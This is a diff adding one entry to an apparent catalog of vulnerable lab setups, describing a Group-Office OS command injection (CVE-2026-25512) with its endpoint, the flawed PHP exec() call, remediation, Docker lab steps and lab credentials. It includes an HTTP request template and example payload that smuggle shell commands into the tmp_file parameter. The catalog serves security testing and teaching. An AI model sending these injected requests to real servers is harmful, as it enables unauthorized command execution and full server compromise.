@@ -1,5 +1,96 @@
 [
   {
+    "id": "vt-2026-25512",
+    "info": {
+      "name": "Group-Office - Remote Code Execution (OS Command Injection)",
+      "author": "omarkurt",
+      "description": "Group-Office is an enterprise customer relationship management and groupware tool. Prior to versions 6.8.150, 25.0.82, and 26.0.5, there is a remote code execution (RCE) vulnerability in Group-Office. The endpoint email/message/tnefAttachmentFromTempFile directly concatenates the user-controlled parameter tmp_file into an exec() call. By injecting shell metacharacters into tmp_file, an authenticated attacker can execute arbitrary system commands on the server. This issue has been patched in versions 6.8.150, 25.0.82, and 26.0.5.\n",
+      "targets": [
+        "group-office",
+        "php"
+      ],
+      "type": "CVE",
+      "cve": "CVE-2026-25512",
+      "cwe": "CWE-78",
+      "cvss": {
+        "score": 9.4,
+        "severity": "critical"
+      },
+      "affected_versions": [
+        "< 6.8.150",
+        "< 25.0.82",
+        "< 26.0.5"
+      ],
+      "patched_versions": [
+        "6.8.150",
+        "25.0.82",
+        "26.0.5"
+      ],
+      "tags": [
+        "groupoffice",
+        "php",
+        "cve-2026",
+        "command-injection",
+        "rce",
+        "authenticated",
+        "critical"
+      ],
+      "references": [
+        "https://github.com/Intermesh/groupoffice/security/advisories/GHSA-579w-jvg7-frr4",
+        "https://github.com/Intermesh/groupoffice/commit/6c612deca97a6cd2a1bd4feea0ce7e8e9d907792",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-25512"
+      ]
+    },
+    "vulnerabilities": {
+      "endpoint": "/api/email/message/tnefAttachmentFromTempFile",
+      "method": "POST",
+      "param": "tmp_file",
+      "auth_required": true,
+      "request": "POST /api/email/message/tnefAttachmentFromTempFile HTTP/1.1\nHost: {{target}}\nContent-Type: application/x-www-form-urlencoded\nCookie: groupoffice={{session}}\nX-CSRFToken: {{csrf_token}}\n\ntmp_file=dummy.dat;{{payload}};%23\n",
+      "response": "HTTP/1.1 200 OK\n\n[Command output appears in response or written to file]\n"
+    },
+    "technical": "The vulnerability exists in `www/modules/email/controller/MessageController.php` in the `actionTnefAttachmentFromTempFile()` function.\n\nUser input from `tmp_file` parameter is passed directly to system shell commands without sanitization. The parameter is concatenated directly into an `exec()` call:\n\n```php\nexec(GO::config()->cmd_tnef.' -C '.$tmpFolder->path().' '.$tmpFile->path(), $output, $retVar);\n```\n\nBy injecting shell metacharacters (e.g., `;`, `|`, `$()`) into the `tmp_file` parameter, an authenticated attacker can break out of the intended command and execute arbitrary system commands.\n\n**Example Payload:** `tmp_file=dummy.dat;id;#`\n",
+    "owasp": {
+      "category": "A03:2021",
+      "name": "Injection"
+    },
+    "impact": "Attackers can execute arbitrary system commands, leading to complete server compromise.\n",
+    "remedy": "Use language-specific APIs instead of shell commands, or sanitize all inputs with escapeshellarg().\n",
+    "remediation": [
+      "Avoid calling OS commands from application code",
+      "Use language-specific APIs instead of shell commands",
+      "Never concatenate user input into commands",
+      "Use escapeshellarg() for any user input passed to shell"
+    ],
+    "poc": {
+      "nuclei": [
+        "vt-2026-25512.nuclei.yaml"
+      ],
+      "bambda": [
+        "vt-2026-25512.bambda"
+      ]
+    },
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml",
+        "port": 8080
+      }
+    },
+    "post-install": [
+      "Start lab: docker-compose up -d",
+      "Wait for initialization (~2 minutes on first run)",
+      "Access Group-Office installer: http://localhost:8080",
+      "username: admin - password: Squint2-Shredder7-Grove3-Thirteen3-Recluse9",
+      "nuclei -t vt-2026-25512.nuclei.yaml -u http://localhost:8000 -v  -var username=admin -var password=Squint2-Shredder7-Grove3-Thirteen3-Recluse9",
+      "Complete installation wizard (DB host: db, user/pass/db: groupoffice)",
+      "Login and get session cookie for exploit testing",
+      "Vulnerable endpoint: POST /api/email/message/tnefAttachmentFromTempFile",
+      "Example payload: tmp_file=dummy.dat;id;#"
+    ],
+    "category": "cves",
+    "added_date": "2026-02-05T17:56:27+03:00"
+  },
+  {
     "id": "vt-2026-1207",
     "info": {
       "name": "Django SQL Injection in RasterField lookup (CVE-2026-1207)",
